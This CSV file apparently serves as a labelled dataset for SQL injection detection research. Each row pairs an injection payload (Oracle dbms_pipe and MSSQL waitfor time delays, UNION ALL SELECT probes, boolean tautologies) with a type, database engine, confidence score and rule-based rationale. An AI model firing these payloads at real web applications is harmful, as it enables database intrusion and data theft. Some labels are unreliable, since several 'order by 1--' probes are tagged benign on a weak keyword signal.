id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
21410,"1%' ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( '%' = '",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
21515,"1' ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
21543,"1 ) as otsb where 8380 = 8380 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
21425,"1"" order by 1--",benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 15 chars.,2
21488,1 waitfor delay '0:0:5'# opyp,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
21519,"-1550%"" ) ) ) order by 1--",benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 26 chars.,2
21523,-6722' ) order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 20 chars.,2
21400,1' ) ) and 4595 = 4595#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 23 chars.,2
21401,-6680' ) or 5483 = 3031 and ( 'zxes' = 'zxes,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 44 chars.,2
21406,"1 ) where 4768 = 4768 union all select null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 79 chars.,2
21415,-8710 or 9323 = 9323#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 21 chars.,2
21420,"-5732' ) union all select 7614,7614,7614,7614--",union_based,generic,0.7,UNION-based payload detected. Payload length: 47 chars.,2
21421,"1"" union all select null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 46 chars.,2
21423,"-7412"" ) as qngt where 2041 = 2041 union all select 2041--",union_based,generic,0.7,UNION-based payload detected. Payload length: 58 chars.,2
21433,"-3620'|| ( select 'kmei' where 8533 = 8533 union all select 8533,8533,8533,8533--",union_based,generic,0.7,UNION-based payload detected. Payload length: 81 chars.,2
21435,-9327' ) or 3038 = 3038,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 23 chars.,2
21446,"-9197%"" ) ) ) union all select 1040,1040,1040,1040,1040,1040,1040,1040,1040#",union_based,generic,0.7,UNION-based payload detected. Payload length: 76 chars.,2
21449,"-8684 union all select 9519,9519,9519,9519--",union_based,generic,0.7,UNION-based payload detected. Payload length: 44 chars.,2
21451,"-9588' ) ) union all select 7280,7280,7280,7280,7280,7280,7280,7280,7280,7280--",union_based,generic,0.7,UNION-based payload detected. Payload length: 79 chars.,2
21454,"-3781 ) union all select 3916,3916,3916--",union_based,generic,0.7,UNION-based payload detected. Payload length: 41 chars.,2
21456,"-5849 ) union all select 6168,6168,6168,6168,6168,6168,6168,6168#",union_based,generic,0.7,UNION-based payload detected. Payload length: 65 chars.,2
21457,"1"" ) ) union all select null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 55 chars.,2
21458,"1' ) as ildf where 5545 = 5545 union all select null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 68 chars.,2
21459,"-3955 where 7276 = 7276 union all select 7276,7276,7276,7276,7276,7276,7276,7276,7276--",union_based,generic,0.7,UNION-based payload detected. Payload length: 87 chars.,2
21460,"1"" ) union all select null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 47 chars.,2
21467,"-2289"" ) or 8624 = 6279 and ( ""ised"" = ""ised",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 44 chars.,2
21470,"-6412 ) ) as cnfs where 6557 = 6557 union all select 6557,6557,6557,6557,6557,6557,6557,6557,6557#",union_based,generic,0.7,UNION-based payload detected. Payload length: 98 chars.,2
21479,"-5826"" ) ) union all select 7192,7192#",union_based,generic,0.7,UNION-based payload detected. Payload length: 38 chars.,2
21480,"-9959"" ) where 7073 = 7073 union all select 7073,7073,7073,7073,7073,7073,7073,7073#",union_based,generic,0.7,UNION-based payload detected. Payload length: 84 chars.,2
21481,"-6381%"" ) ) ) union all select 1503,1503,1503,1503#",union_based,generic,0.7,UNION-based payload detected. Payload length: 51 chars.,2
21482,1' and 7533 = 7533 and 'clqy' like 'clqy,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 40 chars.,2
21483,"1'+ ( select 'rguk' where 6019 = 6019 union all select null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 81 chars.,2
21485,-5286' or 6783 = 1233,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 21 chars.,2
21491,"1"" union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 66 chars.,2
21502,1' ) ) and 7230 = 2517,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 22 chars.,2
21509,"1"" ) where 1416 = 1416 union all select null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 55 chars.,2
21512,"1%"" ) union all select null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 48 chars.,2
21513,"1 ) ) ) union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 71 chars.,2
21514,"-2247' ) union all select 1202,1202,1202,1202,1202#",union_based,generic,0.7,UNION-based payload detected. Payload length: 51 chars.,2
21516,"1"" and 6637 = 2321",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 18 chars.,2
21538,1' ) ) ) union all select null--,union_based,generic,0.7,UNION-based payload detected. Payload length: 32 chars.,2
